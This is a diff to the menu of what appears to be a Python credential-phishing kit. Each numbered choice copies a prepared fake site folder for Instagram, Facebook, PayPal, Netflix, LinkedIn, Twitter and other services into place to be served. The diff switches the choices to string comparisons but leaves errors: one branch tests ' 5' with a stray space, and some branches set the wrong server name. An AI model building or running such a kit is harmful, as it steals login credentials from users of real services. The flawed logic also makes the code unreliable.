@@ -61,46 +61,46 @@ def again():
     try:
         i = raw_input("Enter Your Choice: ")
 
-        if i == 1:
+        if i == "1":
             os.system("cp -r 'sites/instagram'/* './'")
             server = "instagram"
-        elif i == 2:
+        elif i == "2":
             os.system("cp -r 'sites/facebook'/* './'")
             server = "facebook"
-        elif i == 3:
+        elif i == "3":
             os.system("cp -r 'sites/instafollowers'/* './'")
             server = "facebook"
-        elif i == 4:
+        elif i == "4":
             os.system("cp -r 'sites/linkedin'/* './'")
             server = "facebook"
-        elif i == 5:
+        elif i == " 5":
             os.system("cp -r 'sites/messenger'/* './'")
             server = "messenger"
-        elif i == 6:
+        elif i == "6":
             os.system("cp -r 'sites/myspace'/* './'")
             server = "myspace"
-        elif i == 7:
+        elif i == "7":
             os.system("cp -r 'sites/netflix'/* './'")
             server = "netflix"
-        elif i == 8:
+        elif i == "8":
             os.system("cp -r 'sites/paypal'/* './'")
             server = "paypal"
-        elif i == 9:
+        elif i == "9":
             os.system("cp -r 'sites/pinterest'/* './'")
             server = "pinterest"
-        elif i == 10:
+        elif i == "10":
             os.system("cp -r 'sites/snapchat'/* './'")
             server = "snapchat"
-        elif i == 11:
+        elif i == "11":
             os.system("cp -r 'sites/spotify'/* './'")
             server = "spotify"
-        elif i == 12:
+        elif i == "12":
             os.system("cp -r 'sites/twitch'/* './'")
             server = "twitch"
-        elif i == 13:
+        elif i == "13":
             os.system("cp -r 'sites/twitter'/* './'")
             server = "twitter"
-        elif i == 14:
+        elif i == "14":
             os.system("cp -r 'sites/wordpress'/* './'")
             server = "wordpress"
         else:
